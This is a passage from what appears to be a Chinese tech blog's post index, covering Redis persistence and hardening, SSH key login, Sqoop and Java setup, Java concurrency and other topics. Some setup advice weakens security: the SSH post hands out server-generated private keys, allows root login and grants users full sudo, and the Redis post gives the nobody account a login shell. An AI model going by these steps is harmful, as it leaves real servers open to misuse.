3]&gt;&gt;&gt; b = a&gt;&gt;&gt; a[0] = 0&gt;&gt;&gt; a[0, 2, 3] # 这里并没有改变 a 的引用，而是改变了被引用对象的某个元素&gt;&gt;&gt; b[0, 2, 3] # 由于被引用对象发生了变化，因此 b 对应的值也发生了改变 由于列表的这种可变性，在代码执行某些操作时可能出现一些意外，因此需要对其进行拷贝来保持原来的列表123456789&gt;&gt;&gt; a = [1, 2, 3]&gt;&gt;&gt; b = a[:]&gt;&gt;&gt; id(a)140200275166560&gt;&gt;&gt; id(b)140200275238712 # 由于 b 引用的是 a 引用对象的一个拷贝，两个变量指向的内存空间不同&gt;&gt;&gt; a[0] = 0&gt;&gt;&gt; b[1, 2, 3] # 改变 a 中的元素并不会引起 b 的变化 对于字典和集合等没有分片概念的类型来说，可以使用 copy 模块中的 copy() 方法进行拷贝 12&gt;&gt;&gt; import copy&gt;&gt;&gt; b = copy.copy(a) python深度拷贝与浅拷贝可移步：http://blog.csdn.net/yugongpeng_blog/article/details/46604439 对象相等== 操作符用于测试两个被引用的对象的值是否相等is 用于比较两个被引用的对象是否是同一个对象12345678&gt;&gt;&gt; a = [1, 2, 3]&gt;&gt;&gt; b = a&gt;&gt;&gt; a is bTrue # a 和 b 指向相同的对象&gt;&gt;&gt; a = [1, 2, 3]&gt;&gt;&gt; b = [1, 2, 3]&gt;&gt;&gt; a is bFalse # a 和 b 指向不同的对象 当操作对象为一个较小的数字或较短的字符串时，又有不同：1234&gt;&gt;&gt; a = 7&gt;&gt;&gt; b = 7&gt;&gt;&gt; a is bTrue # a 和 b 指向相同的对象 这是由于 Python 的缓存机制造成的，小的数字和字符串被缓存并复用，所以 a 和 b 指向同一个对象 对象回收机制上边提到对象包含一个引用的计数器，计数器记录了当前指向该对象引用的数目，一旦对象的计数器为 0 ，即不存在对该对象的引用，则这个对象的内存空间会被回收。这就是 Python 中对象的回收机制，一个最明显的好处即在编写代码过程中不需要考虑释放内存空间。 可以通过 sys 模块中的 getrefcount() 函数查询一个对象计数器的值123&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.getrefcount(1)718","link":"/2017/03/20/Python%20%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/"},{"title":"Redis开启AOF导致的删库事件","text":"事件背景Redis主从开启AOF，错误操作导致数据被清空。 Redis主要作用：缓存、队列。 事故过程Redis搭建了主从，持久化方式为RDB，RDB没有定时备份，且AOF都没有开启。考虑到开启AOF会使Redis安全性更高，所以尝试先在从机做测试，没问题后再上主机。 Redis开启AOF的方式非常简单，打开Redis的conf文件，找到【appendonly】配置项，将【no】改为【yes】重启服务即可。 Redis从机重启后，成功在数据目录生成了百M以上的【appendonly.aof】文件，以该aof文件单独启动Redis实例，生成的数据和单独以RDB文件启动生成的数据一样，因此判断从机AOF配置成功。 接着直接上了主机，Redis主机以同样的方式配置AOF后，结果实例重启的瞬间，Redis主从数据被清空，主从AOF及RDB文件大小接近0M。 问题分析1、为什么在已经开启RDB持久化的情况下，还打算开启AOF？ 解答：同时开启两种持久化，Redis拥有足以媲美PostgreSQL的数据安全性。 123456789101112131415161718192021RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照，常用做备份。AOF 持久化记录服务器执行的所有写操作命令，并在服务器启动时，通过重新执行这些命令来还原数据集。RDB默认的快照保存配置：save 900 1 #900秒内如果超过1个key被修改，则发起快照保存save 300 10 #300秒内容如超过10个key被修改，则发起快照保存save 60 10000 #60秒内容如超过10000个key被修改，则发起快照保存而AOF默认策略则为每秒钟一次fsync当然你也可以设置不同的fsync策略，比如无fsync或者每秒钟一次fsync，或者每次执行写入命令时fsyncAOF文件有序地保存了对数据库执行的所有写入操作，这些写入操作以Redis协议的格式保存。因此AOF文件的内容非常容易被人读懂，对文件进行分析也很轻松。 导出AOF文件也非常简单：举个例子，如果你不小心执行了 FLUSHALL 命令，但只要AOF文件未被重写，那么只要停止服务器，移除AOF文件末尾的FLUSHALL命令，并重启Redis，就可以将数据集恢复到FLUSHALL执行之前的状态。有效地利用以上的RDB和AOF特性，能使Redis拥有足以媲美PostgreSQL的数据安全性。 2、为什么在从机AOF配置成功的情况下，主机开启AOF，主从数据瞬间被清空？ 解答：首先得明白Redis有这么一个特性，即两种持久化同时开启的情况下，Redis启动默认加载AOF文件恢复数据。 Redis从机由于事先没有开启AOF，配置重启后，从机会生成一个空的AOF文件并默认加载，这时从机数据是空的，但由于配置了主从，从机会同步主机数据，所以你会发现新生成的AOF文件大小在迅速增长。因此Redis从机开启AOF后，数据最终是没有问题的。 这时候Redis主机也配置AOF并重启，主机生成AOF并默认加载，数据瞬间被清空，同时主机RDB发现60秒内有超过10000个key被修改，发起了快照保存，RDB数据也被清空。由于都是内存操作，所以非常快。最后再主从同步，所有数据被删。 3、两种持久化同时开启的情况下，Redis启动为什么默认选择加载AOF而不是RDB文件来恢复数据？解答：AOF默认策略为每秒钟一次fsync，所以通常情况下，AOF文件所保存的数据相对RDB更完整。 4、AOF 持久化会记录服务器执行的所有写操作命令，那么数据被清空后，为什么不能通过AOF文件的日志记录恢复数据？解答：Redis会自动地在后台对AOF进行重写，重写后的新AOF文件包含了恢复当前数据集所需的最小命令集合 12345为什么会重写？因为AOF记录了服务器执行的所有写操作命令，而RDB本身又是一个非常紧凑的文件所以对于相同的数据集来说，AOF文件的体积通常要大于RDB文件的体积而体积大了终究不好，比如Redis重启默认加载AOF文件就要更多的时间 5、面试官如果问你，如何在不用【config set】命令的情况下，将Redis持久化由RDB切换到AOF，你怎么回答？解答：呵呵，利用主从。。。从机配置AOF重启后，将生成的AOF文件复制至主机Redis数据目录，主机配置AOF后再重启。 1234567891011121314注：在 Redis 2.2 或以上版本，通过【config set】可以在不重启的情况下，从 RDB 切换到 AOF。1）为最新的 dump.rdb 文件创建一个备份。2）将备份放到一个安全的地方。3）执行以下两条命令：redis-cli&gt; CONFIG SET appendonly yesredis-cli&gt; CONFIG SET save \"\"4）确保命令执行之后，数据库的键的数量没有改变。5）确保写命令会被正确地追加到 AOF 文件的末尾。步骤 3 执行的第一条命令开启了AOF功能：&lt;font style=\"color:red\"&gt;Redis会阻塞直到初始AOF文件创建完成为止&lt;/font&gt;，之后Redis会继续处理命令请求， 并开始将写入命令追加到 AOF 文件末尾。步骤 3 执行的第二条命令用于关闭RDB功能。这一步是可选的，如果你愿意的话，也可以同时使用RDB和AOF这两种持久化功能。不过别忘了在redis.conf中打开AOF功能！否则的话，服务器重启之后，之前通过【CONFIG SET】设置的配置就会被遗忘，程序会按原来的配置来启动服务器。","link":"/2017/05/27/Redis%E5%BC%80%E5%90%AFAOF%E5%AF%BC%E8%87%B4%E7%9A%84%E5%88%A0%E5%BA%93%E4%BA%8B%E4%BB%B6/"},{"title":"SSH免密登陆","text":"免密登录流程 免密登陆配置1、以root用户登录系统，新建用户username，并指定用户登录的起始目录12345678910111213141516adduser -d /home/username -m username# adduser命令详解-c：加上备注文字，备注文字保存在passwd的备注栏中。 -d：指定用户登入时的启始目录。-D：变更预设值。-e：指定账号的有效期限，缺省表示永久有效。-f：指定在密码过期后多少天即关闭该账号。-g：指定用户所属的起始群组。-G：指定用户所属的附加群组。-m：自动建立用户的登入目录。-M：不要自动建立用户的登入目录。-n：取消建立以用户名称为名的群组。-r：建立系统账号。-s：指定用户登入后所使用的shell。-u：指定用户ID号 2、为用户设置密码1234passwd usernameold password:******new password:*******Re-enter new password:******* 3、从root用户切换为username用户，然后进入刚才创建的初始目录，创建.ssh文件夹12345su usernamecd /home/usernamemkdir .sshcd .ssh 4、生成秘钥，如有提示可以一路回车1ssh-keygen -t rsa如果成功，会在/home/username/.ssh/目录下生成名为id_rsa和id_rsa.pub的一对公钥私钥注意：以上命令需切换为username用户执行，否则秘钥文件会自动生成在/root/.ssh/目录下 5、将公钥文件的内容copy至authorized_keys文件，然后修改相关权限1234cat id_rsa.pub &gt;&gt; authorized_keyschmod 600 authorized_keyschown username:username /home/username/.ssh/ 6、为用户赋予root权限1234vim /etc/sudoers## Allow root to run any commands anywhereroot ALL=(ALL) ALLusername ALL=(ALL) ALL 7、设置每个用户登录时读取自己的免密配置文件，并取消服务器密码登录，开启免密验证12345678910vim /etc/ssh/sshd_configRSAAuthentication yesPubkeyAuthentication yesAuthorizedKeysFile %h/.ssh/authorized_keysPasswordAuthentication noPermitRootLogin yesRSAAuthentication yesPubkeyAuthentication yes 8、重启sshd服务，使配置生效1/etc/init.d/sshd restart 将/home/username/.ssh/下的私钥文件id_rsa发给相应用户，该用户即可使用私钥文件免密登录了。 本文为了省事，公钥私钥是自己在服务器上生成的，其实也可以用户自己执行命令生成公钥私钥，然后把公钥传至服务器/home/username/.ssh/下，并重命名为authorized_keys。","link":"/2017/01/02/SSH%E5%85%8D%E5%AF%86%E7%99%BB%E9%99%86/"},{"title":"Spark学习资料共享","text":"链接相关课件代码：http://pan.baidu.com/s/1nvbkRSt教学视频：http://pan.baidu.com/s/1c12XsIG这是最近买的付费教程，对资料感兴趣的可以在下方留下邮件地址，我会定期进行密码发送。 课程简介以目前主流的，最新的spark稳定版2.1.x为基础，深入浅出地介绍Spark生态系统原理及应用，内容包括Spark各组件(Spark Core/SQL/Streaming/MLlib)基本原理，使用方法，实战经验以及在线演示。本课程精心设计了五个企业级应用案例，帮助大家在理解理论的基础上，亲手实践和应用spark。 课程优化 讲述最新、最稳定的Spark2.1.X版本 精心设计5个企业级应用案例，更好地实践、应用Spark 面向人群 大数据爱好者 Spark初中级学者 对Spark感兴趣、想系统性学习者 学习收益 熟练使用Spark， 理解Spark原理，熟知Spark内幕 掌握Spark 2.1新增特性并熟练使用 用有丰富的Spark企业实战经验 课程大纲第一部分: Spark 概述 第一课：Spark 2.1概述 Spark产生背景包括mapreduce缺陷，多计算框架并存等 Spark 基本特点 Spark版本演化 Spark核心概念包括RDD, transformation, action, cache等 Spark生态系统包括Spark生态系统构成，以及与Hadoop生态系统关系 Spark在互联网公司中的地位与应用介绍当前互联网公司的Spark应用案例 Spark集群搭建包括测试集群搭建和生产环境中集群搭建方法，并亲手演示整个过程 背景知识补充介绍 a. Hadoop基础 b. HDFS简介（特点、架构与应用） c. YARN简介（架构） d. MapReduce简介（编程模型与应用） I. Eclipse与Intellij IDEA II. Maven 第二部分: Spark Core 第二课：Spark 程序设计与企业级应用案例 Spark运行模式介绍 Spark运行组件构成，spark运行模式（local、standalone、mesos/yarn等） Spark开发环境构建 集成开发环境选择，亲手演示spark程序开发与调试，spark运行 常见transformation与action用法 介绍常见transformation与action使用方法，以及代码片段剖析 常见控制函数介绍 包括cache、broadcast、accumulator等 Spark 应用案例：电影受众分析系统 包括：背景介绍，数据导入，数据分析，常见Spark transformation和action用法在线演示 第三课：Spark 内部原理剖析与源码阅读 Spark运行模式剖析 深入分析spark运行模式，包括local，standalone以及spark on yarn Spark运行流程剖析 包括spark逻辑查询计划，物理查询计划以及分布式执行 Spark shuffle剖析 深入介绍spark shuffle的实现，主要介绍hash-based和sort-based两种实现 Spark 源码阅读 Spark源码构成以及阅读方法 第四课：Spark 程序调优技巧 数据存储格式调优数据存储格式选择，数据压缩算法选择等 资源调优如何设置合理的executor、cpu和内存数目，YARN多租户调度器合理设置，启用YARN的标签调度策略等 程序参数调优介绍常见的调优参数，包括避免不必要的文件分发，调整任务并发度，提高数据本地性，JVM参数调优，序列化等 程序实现调优如何选择最合适的transformation与action函数 调优案例分享与演示演示一个调优案例，如何将一个spark程序的性能逐步优化20倍以上。 第三部分 Spark SQL 2.1 第五课：Spark SQL基本原理 Spark SQL是什么 Spark SQL基本原理 Spark Dataframe与DataSet Spark SQL与Spark Core的关系 第六课：Spark SQL程序设计与企业级应用案例 Spark SQL程序设计 a. 如何访问MySQL、HDFS等数据源，如何处理parquet格式数据 b. 常用的DSL语法有哪些，如何使用 c. Spark SQL调优技巧 Spark SQL应用案例：篮球运动员评估系统 a. 背景介绍 b. 数据导入 c. 数据分析 d. 结论 第四部分 Spark Streaming 第七课：Spark Streaming、程序设计及应用案例 1.Spark Streaming基本原理 a. Spark Streaming是什么 b. Spark Streaming基本原理 c. Structured Streaming d. Spark Streaming 编程接口介绍 e. Spark Streaming应用案例 Spark Streaming程序设计与企业级应用案例 a. 常见流式数据处理模式 b. Spark Streaming与Kafka 交互 c. Spark Streaming与Redis交互 d. Spark Streaming部署与运行 e. Spark Streaming企业级案例：用户行为实时分析系统 第五部分 Spark MLlib 第八课： Spark MLlib及企业级案例 Spark MLlib简介 数据表示方式 MLlib中的聚类、分类和推荐算法 如何使用MLlib的算法 Spark MLLib企业级案例：信用卡欺诈检测系统 第六部分Spark综合案例 第九课：简易电影推荐系统 背景介绍 什么是Lambda architecture 利用HDFS+Spark Core+MLlib+Redis构建批处理线 利用Kafka+Spark Streaming+Redis构建实时处理线 整合批处理和实时处理线 扩展介绍：Apache beam：统一编程模型及应用 图片相关","link":"/2017/04/09/Spark%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E5%85%B1%E4%BA%AB/"},{"title":"Sqoop简介及安装","text":"Hadoop业务的大致开发流程以及Sqoop在业务中的地位： Sqoop概念Sqoop可以理解为【SQL–to–Hadoop】，正如名字所示，Sqoop是一个用来将关系型数据库和Hadoop中的数据进行相互转移的工具。它可以将一个关系型数据库(例如Mysql、Oracle)中的数据导入到Hadoop(例如HDFS、Hive、Hbase)中，也可以将Hadoop(例如HDFS、Hive、Hbase)中的数据导入到关系型数据库(例如Mysql、Oracle)中。 Sqoop版本对比Sqoop1和Sqoop2对比： 两个版本，完全不兼容，Sqoop1几乎无法平滑升级到Sqoop2 版本号划分区别 Apache版本：1.4.x(Sqoop1); 1.99.x(Sqoop2) CDH版本 : Sqoop-1.4.3-cdh4(Sqoop1) ; Sqoop2-1.99.2-cdh4.5.0 (Sqoop2) Sqoop2 相对 Sqoop1的改进 引入Sqoop server，集中化管理connector等 访问方式多样化：CLI(command-line interface，命令行界面)，Web UI，REST API 引入基于角色的安全机制 在架构上，sqoop2引入了sqoop server（具体服务器为tomcat），对connector实现了集中的管理。其访问方式也变得多样化了，其可以通过REST API、JAVA API、WEB UI以及CLI控制台方式进行访问。 另外，其在安全性能方面也有一定的改善，在sqoop1中我们经常用脚本的方式将HDFS中的数据导入到mysql中，或者反过来将mysql数据导入到HDFS中，其中在脚本里边都要显示指定mysql数据库的用户名和密码的，安全性做的不是太完善。在sqoop2中，如果是通过CLI方式访问的话，会有一个交互过程界面，你输入的密码信息不被看到。 Sqoop架构对比 安装部署移步sqoop官网：http://sqoop.apache.org/我们可以看到现在的稳定版本是1.4.6，1.99.7与1.4.6不兼容，并且1.99.7不适用于生产部署。所以我们下载1.4.6版本。 1、下载下载地址：http://www-eu.apache.org/dist/sqoop/1.4.6/下载 sqoop-1.4.6.bin__hadoop-1.0.0.tar.gz 2、解压安装12345tar -zxvf sqoop-1.4.6.bin__hadoop-1.0.0.tar.gz -C /datacd /datamv sqoop-1.4.6.bin__hadoop-1.0.0/ sqoop1chmod -R 775 /data/sqoop1chown -R hadoop:hadoop /data/sqoop1 3、配置环境变量123456vim /etc/profileexport SQOOP_HOME=/data/sqoop1export PATH=$PATH:$SQOOP_HOME/binsource /etc/profile 4、其他配置 （1）下载mysql驱动包，mysql-connector-java-5.1.40-bin.jar，把jar包丢到到$SQOOP_HOME/lib下面 （2）接下来修改sqoop的配置文件 12345678910111213141516171819cd /data/sqoop1/confcp sqoop-env-template.sh sqoop-env.sh vim sqoop-env.sh # 指定各环境变量的实际配置# Set Hadoop-specific environment variables here.#Set path to where bin/hadoop is available#export HADOOP_COMMON_HOME=#Set path to where hadoop-*-core.jar is available#export HADOOP_MAPRED_HOME=#set the path to where bin/hbase is available#export HBASE_HOME=#Set the path to where bin/hive is available#export HIVE_HOME= 5、验证是否成功12345# 列出所有数据库sqoop list-databases --connect jdbc:mysql://ip:port --username username --password pwd# 列出数据库所有表sqoop list-tables --connect jdbc:mysql://ip:port/dbname --username username --password pwd 链接相关大数据进阶计划http://wangxin123.com/2017/02/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E8%BF%9B%E9%98%B6%E8%AE%A1%E5%88%92/ Sqoop下载地址http://www-eu.apache.org/dist/sqoop/1.4.6/ Sqoop v1.4.6 文档http://sqoop.apache.org/docs/1.4.6/index.html","link":"/2017/02/27/Sqoop%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%AE%89%E8%A3%85/"},{"title":"TWaver 2D+GIS+3D的试用和在线Demo","text":"TWaver 2D for HTML5试用下载：http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-5.4.7.zip TWaver GIS for HTML5试用下载：http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-html5-5.4.7.zip TWaver 3D for HTML5试用下载：各种在线3D Demo：http://idc.servasoft.com:8081/twaver-html5-3d/三维机房、变电站、会议室等都在里面。 TWaver 3D for HTML5（SDK/引擎）的试用下载（这个里面有上面在线demo的源代码）http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-3d-2.2.0.zip文档http://doc.servasoft.com/twaver-document-center/twaver-html5-3d-v2/ TWaver Make（模型库）的下载链接和文档：http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-make-1.4.zip文档http://doc.servasoft.com/twaver-document-center/twaver-make/ TWaver Doodle（编辑器）的下载：http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-doodle-1.4.zip文档http://doc.servasoft.com/twaver-document-center/twaver-doodle/ TWaver 2D for Java试用下载：http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-java-4.6.3.zip TWaver GIS for Java试用下载：http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-java-4.5.6.zip","link":"/2016/05/10/TWaver%202D+GIS+3D%E7%9A%84%E8%AF%95%E7%94%A8%E5%92%8C%E5%9C%A8%E7%BA%BFDemo/"},{"title":"countDownLatch和cyclicBarrier","text":"《 Effecit In Java 》说过，从java 1.5发现版本开始, 就不建议使用wait和notify，它们使用比较困难，可以使用更高级并发工具来替代。 图一所说的同步器是指那些能使线程等待另一个线程的对象，常用的有cyclicBarrier和倒计数锁存器CountDownLatch和semaphore。 CountDownLatch一个同步辅助类，在完成一组正在其他线程中执行的操作之前，它允许一个或多个线程一直等待。它的倒计数类似于AutomicInteger的getAndDecrement()。但它还有另一个主要作用类似于 wait和notify。代码示例：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package com.bbk.u001.handle;import java.util.concurrent.CountDownLatch;import javax.annotation.PostConstruct;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;import org.springframework.stereotype.Component;/** * CountDownLatch的使用 * @ClassName: StatsSimilarKnowledgeHandle * @Description: TODO * @author wasim * @create at 2015-8-12 下午8:44:51 * */@Componentpublic class CountDownLatchHandle { @Autowired ThreadPoolTaskExecutor executor; @PostConstruct public void handleStatsQuestionKnowledge(){ CountDownLatch startSignal = new CountDownLatch(12); //导出文件 executor.execute(new ExportStats(startSignal)); //导出文件前，需要先循环下面12个线程 for(int i=0;i&lt;12;i++){ executor.execute(new similarKnowledgeHandle(startSignal)); } } public class similarKnowledgeHandle implements Runnable{ CountDownLatch startSignal; public similarKnowledgeHandle(CountDownLatch startSignal) { this.startSignal =startSignal; } @Override public void run() { startSignal.countDown(); System.out.println(startSignal.getCount()); //显示当前计数 } } public class ExportStats implements Runnable{ CountDownLatch startSignal; public ExportStats(CountDownLatch startSignal) { this.startSignal =startSignal; } @Override public void run() { try { startSignal.await(); //当计数为0前，导出文件的线程一直处于等待状态 System.out.println(&quot;start export.......&quot;); } catch (InterruptedException e) { e.printStackTrace(); } } }} cyclicBarrier一个同步辅助类，它允许一组线程互相等待，直到到达某个公共屏障点 (common barrier point)。在涉及一组固定大小的线程的程序中，这些线程必须不时地互相等待，此时 CyclicBarrier 很有用。因为该 barrier 在释放等待线程后可以重用，所以称它为循环 的 barrier。 代码示例：1234567891011121314151617181920212223242526272829303132333435363738class Solver { final int N; final float[][] data; final CyclicBarrier barrier; class Worker implements Runnable { int myRow; Worker(int row) { myRow = row; } public void run() { while (!done()) { processRow(myRow); try { barrier.await(); } catch (InterruptedException ex) { return; } catch (BrokenBarrierException ex) { return; } } } } public Solver(float[][] matrix) { data = matrix; N = matrix.length; barrier = new CyclicBarrier(N, new Runnable() { public void run() { mergeRows(...); } }); for (int i = 0; i &lt; N; ++i) new Thread(new Worker(i)).start(); waitUntilDone(); } } cyclicBarrier 和 CountDownLatch 的区别","link":"/2016/04/16/countDownLatch%E5%92%8CcyclicBarrier/"},{"title":"VPSMate","text":"VPSMate特性最近发现了一个Linux服务器WEB管理工具，挺不错的，有如下性能： 快速在线安装、小巧且节省资源 当前支持 CentOS/Redhat 5.4+、6.x 基于发行版软件源的软件管理机制 轻松构建 Linux + Nginx + MySQL + PHP 环境 强大的在线文件管理和回收站机制 快速创建和安装多种站点 丰富实用的系统工具 VPSMate官网http://www.vpsmate.org/ 核心安装文件install.py 下载地址http://pan.baidu.com/s/1eSgFpIU 密码：yaju","link":"/2016/08/30/VPSMate/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2020/05/19/hello-world/"},{"title":"linux中搭建java开发环境","text":"JDK安装http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html下载对应jdk版本，比如 jdk-7u80-linux-x64.tar.gz。 1234567891011121314# 执行下面命令安装JDKtar -xvf jdk-7u80-linux-x64.tar.gz -C /usr/localcd /usr/localmv jdk1.7.0_79/ jdk# 设置环境变量vim /etc/profile export JAVA_HOME=/opt/java/jdkexport PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar# 使配置文件生效source /etc/profile 执行java -version命令，测试一下是否安装成功。Tomcat安装12345678910# 解压mkdir -p /opt/tomcattar -xvf apache-tomcat-6.0.10.tar.gz -C /opt/tomcat/# 创建一个链接ln -s /opt/tomcat/apache-tomcat-6.0.10 /opt/tomcat/tomcat6.0cd /opt/tomcat/tomcat6.0/bin./startup.sh 再打开浏览器测试一下，输入http:localhost:8080，猫的页面出来，说明安装成功了。 自动化部署脚本JDK：https://github.com/Wasim37/deployment-scripts/tree/master/javaTomcat：https://github.com/Wasim37/deployment-scripts/tree/master/tomcat","link":"/2016/05/29/linux%E4%B8%AD%E6%90%AD%E5%BB%BAjava%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"},{"title":"Redis安装","text":"redis简介redis是一个性能非常优秀的内存数据库，通过key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set —有序集合)和hashs（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。 Redis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部 分场合可以对关系数据库起到很好的补充作用。它提供了Python，Ruby，Erlang，PHP客户端，使用很方便。redis的安装配置，比较简单，详见官方网站。 安装检查安装依赖程序123yum install gcc-c++yum install -y tclyum install wget 获取安装文件1wget http://download.redis.io/releases/redis-2.8.24.tar.gz 解压文件123tar -xzvf redis-2.8.24.tar.gzmv redis-2.8.24 rediscd redis 安装及版本查看123456#编译安装makemake install#版本查看redis-server --version 设置配置文件路径12mkdir -p /etc/rediscp redis.conf /etc/redis 修改配置文件12345vim /etc/redis/redis.conf#仅修改daemonize，no设置为yes，按守护进程启动#密码设置、多实例、主从搭建可以查看本站另一篇文章daemonize yes 启动12345/usr/local/bin/redis-server /etc/redis/redis.confps -ef | grep redisroot 8033 1 0 19:36 ? 00:00:00 /usr/local/bin/redis-server *:6379 root 8084 4991 0 19:46 pts/0 00:00:00 grep redis 使用客户端12345redis-cli&gt;set name davidOK&gt;get name\"david\" PS：如果要卸载redis，把/usr/local/bin/目录下的redis删除即可。为了卸载干净，你还可以把解压和编译的redis包及配置的redis.conf也删除。 &lt;/br&gt; 安全配置设置密码redis的默认安装是不设置密码的，可以在redis.conf中进行配置12# vim /etc/redis/redis.confrequirepass CWWmCeM79Sgz2imp或者通过命令设置1CONFIG set requirepass \"CWWmCeM79Sgz2imp\"由于Redis的性能极高，并且输入错误密码后Redis并不会进行主动延迟（考虑到Redis的单线程模型），所以攻击者可以通过穷举法破解Redis的密码（1秒内能够尝试十几万个密码），因此在设置时一定要选择复杂的密码，可以用随机密码生成器生成。 注意：配置Redis复制的时候如果主数据库设置了密码，需要在从数据库的配置文件中通过masterauth参数设置主数据库的密码，以使从数据库连接主数据库时自动使用AUTH命令认证。详见本站的另一篇文章《Redis多实例及主从搭建》。 禁止高危命令12345678# vim /etc/redis/redis.confrename-command FLUSHALL \"\"rename-command FLUSHDB \"\"rename-command CONFIG \"\"rename-command EVAL \"\"# 保存，重启redis，进入客户端，输入flushall等命令，出现如下提示# (error) ERR unknown command 'flushall' 曾经我的测试服务器发生过一次这样的事故，由于安装的redis没有设置密码，被人通过扫描ip加默认的6379端口，进入了redis，然后通过config命令修改了我的免密码登录文件，导致所有人无法登录服务器。所以为了安全，你还可以修改你的默认redis端口。事故详情见本站另一篇文章《彻底清除Linux centos minerd木马》 绑定只能本机连接Redis的默认配置会接受来自任何地址发送来的请求。即在任何一个拥有公网IP的服务器上启动Redis服务器，都可以被外界直接访问到。 如果只允许本机应用连接Redis，可在配置文件中修改bind参数。 12# vim /etc/redis/redis.confbind 127.0.0.1 使用linux nobody启动redis在root账户下使用nobody用户启动程序xxx的方法：1su -m nobody -c xxxnobody账户默认是无法登陆的，直接使用su -nobody会出现1This account is currently not available.需要修改配置文件etc/passwd实现登陆1234567vim /etc/passwd # 找到 nobody:x:99:99:Nobody:/:/sbin/nologin，改成如下nobody:x:99:99:Nobody:/:/bin/bash # 保存执行su -nobody 开机自启动1echo \"/usr/local/bin/redis-server /etc/redis/redis.conf &amp;\" &gt;&gt; /etc/rc.local 自动化部署脚本https://github.com/Wasim37/deployment-scripts/tree/master/redis 相关链接redis中文官网：http://doc.redisfans.com/ reids设计与实现http://redisbook.readthedocs.org/en/latest/index.html redis使用场景http://www.360doc.com/content/15/0510/20/23016082_469494498.shtml redis conf配置详解http://www.cnblogs.com/kreo/p/4423362.html","link":"/2016/09/16/redis%E5%AE%89%E8%A3%85/"},{"title":"word文档解析","text":"背景在互联网教育行业，做内容相关的项目经常碰到的一个问题就是如何解析word文档。因为系统如果无法智能的解析word，那么就只能通过其他方式手动录入word内容，效率低下，而且人工成本和录入出错率都较高。 疑难点word解析可以预见的困难主要有以下几个方面: word 结构问题 —— word不开源，且含有很多非文本内容，比如图表，而已知的常规方法只能解析纯文本内容，所以如果不知道word内部层级结构，解析将难以进行。 word 公式问题 —— word公式来源并非单一，可能是用MathType插件生成的latex公式，也可能是用word自带公式编辑器生成的公式，还有可能公式部分手敲，部分使用搜狗输入法或者其它编辑器输入。不同来源处理方式是否一样？且能否有效读取文档各种上下脚标？方便后期展示？ word 非文本问题 —— word含有很多的非文本内容，比如图表。来源也多样，图表可能是用word自带的画图工具生成的，也有可能是复制粘贴的，不同来源解析方式是否一样？且读取的时候是否能有效获取图片的位置及大小信息？方便文档内容后期在PC端和移动端展示。无论最终方案是什么，肯定是将所有的且需要的非文本信息转换为文本信息。 word 版本问题 —— word有03、07等好几个版本，还有WPS版本，解析是否要全部兼容？后缀名有docx和doc，是否全部兼容？当然，前提是已经成功解析一种类型。 word 规范问题 —— 有些word可能是早期制作的，返工代价太大，所以格式内容多样化。而且就算制定word格式规范，新制作的word也无法保证格式一定正确，除非是程序自动生成的文档。举个例子，试题的题序，肉眼无法区分的格式就有好几种。程序只可能尽量覆盖绝大部分情况，考虑的情况越多，解析正确率越高，当然程序也更复杂。 Java解析word以前曾用Java解析过word文档，所以最先考虑用Java来解决问题，网上搜索方案主要有如下几种： jacob：网上资料较少，目前已经实现的是用jacob解析mathtype输入的公式，然后调用word宏命令转成latex，但jacob无法解析word自带的公式。jacob也可以定位word图片总数及word图片位置，但目前没找到将图片另存本地的方法。 poi：情况与jacob类似。 Aspose.words：一个商业收费类库，可以使应用程序处理大量的文件任务，支持word、pdf等各种格式操作。但是看文档介绍没有关于公式的处理方案。 Java使用以上几种方案的确解决了部分问题，但很多异常情况还是无法处理，比如无法定位word的批注等。以下是使用Java定位word图片总数及其位置的代码，更多解决方案请戳 http://www.cnblogs.com/x_wukong/p/4270867.html123456789101112131415161718192021222324252627282930313233343536373839404142434445package com.latex.test;import com.jacob.activeX.ActiveXComponent;import com.jacob.com.Dispatch;import com.jacob.com.Variant;public class test { public static void main(String[] args) { long time1 = System.currentTimeMillis(); ActiveXComponent word = new ActiveXComponent(\"word.Application\"); Dispatch wordObject = (Dispatch) word.getObject(); Dispatch.put((Dispatch) wordObject, \"Visible\", new Variant(false)); Dispatch documents = word.getProperty(\"Documents\").toDispatch(); Dispatch document = Dispatch.call(documents, \"Open\", \"D://test.docx\").toDispatch(); Dispatch wordContent = Dispatch.get(document, \"Content\").toDispatch(); Dispatch paragraphs = Dispatch.get(wordContent, \"Paragraphs\").toDispatch(); int paragraphCount = 